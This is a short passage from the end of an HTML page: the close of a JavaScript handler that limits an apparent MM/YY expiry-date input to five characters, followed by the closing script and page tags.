  // Limit input length to 5 characters (MM/YY + slash)
  if (input.value.length > 5) {
    input.value = input.value.slice(0, 5);
  }
}
</script>


</body></html>